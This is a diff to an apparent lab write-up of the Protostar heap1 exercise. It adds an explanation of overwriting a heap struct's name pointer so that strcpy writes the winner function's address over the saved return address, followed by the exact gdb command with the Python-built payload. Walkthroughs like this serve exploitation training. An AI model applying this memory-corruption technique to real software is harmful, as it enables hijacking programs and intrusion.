@@ -1576,12 +1576,10 @@ Starting program: /home/ubuntu/workspace/exploit-exercises/protostar/binaries/he
    0x804856a:   nop
 --------------------------------------------------------------------------------
 ```
-Now we just have to figure out how we want to use this.
-TBC
-
+Now we just have to figure out how we want to use this. We can overwrite the i2.name pointer to our stack, and then strcpy winner's location to that address, and when we return we can jump to it, but we need to make sure ASLR is off for this.
 ###winning command:
 ```bash
+                               #ESP on ret of main                       #location of win
+run $(python -c "print 'a'*20+'\x9c\xd0\xff\xff'") $(python -c "print '\x94\x84\x04\x08'")
 ```
-###Python exploit:
-```Python
-```
+
